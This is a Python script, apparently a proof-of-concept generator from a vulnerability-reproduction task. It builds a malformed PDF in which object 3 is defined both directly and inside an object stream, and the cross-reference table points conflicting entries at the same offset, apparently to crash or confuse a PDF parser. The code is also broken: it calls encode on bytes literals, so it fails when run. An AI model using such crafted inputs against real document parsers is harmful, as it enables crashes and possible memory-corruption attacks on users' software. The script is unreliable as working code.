class Solution:
    def solve(self, src_path: str) -> bytes:
        parts = []
        offset = 0

        header = b"%PDF-1.5\n"
        parts.append(header)
        offset += len(header)

        obj1 = b"""1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

""".encode('latin1')
        parts.append(obj1)
        obj1_offset = offset
        offset += len(obj1)

        obj3_direct = b"""3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj

""".encode('latin1')
        parts.append(obj3_direct)
        obj3_direct_offset = offset
        offset += len(obj3_direct)

        obj2 = b"""2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

""".encode('latin1')
        parts.append(obj2)
        obj2_offset = offset
        offset += len(obj2)

        stream_str = b"3 0\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Other /Value >>\n"
        stream_len = len(stream_str)

        obj4_pre = b"""4 0 obj
<< /Type /ObjStm /N 1 /First 0 /Length """ + str(stream_len).encode('latin1') + b""" >>
stream
""".encode('latin1')
        parts.append(obj4_pre)
        obj4_offset = offset
        offset += len(obj4_pre)

        parts.append(stream_str)
        offset += stream_len

        obj4_post = b"endstream\nendobj\n\n".encode('latin1')
        parts.append(obj4_post)
        offset += len(obj4_post)

        xref_start = offset
        xref = b"xref\n0 5\n0000000000 65535 f \n"
        xref += f"{obj1_offset:010d}".encode('latin1') + b" 00000 n \n"
        xref += f"{obj2_offset:010d}".encode('latin1') + b" 00000 n \n"
        xref += f"{obj4_offset:010d}".encode('latin1') + b" 00000 n \n"
        xref += f"{obj4_offset:010d}".encode('latin1') + b" 00000 n \n"
        parts.append(xref)
        offset += len(xref)

        trailer = b"""trailer
<< /Size 5 /Root 1 0 R >>
startxref
""" + str(xref_start).encode('latin1') + b"""
%%EOF
""".encode('latin1')
        parts.append(trailer)

        pdf = b''.join(parts)
        return pdf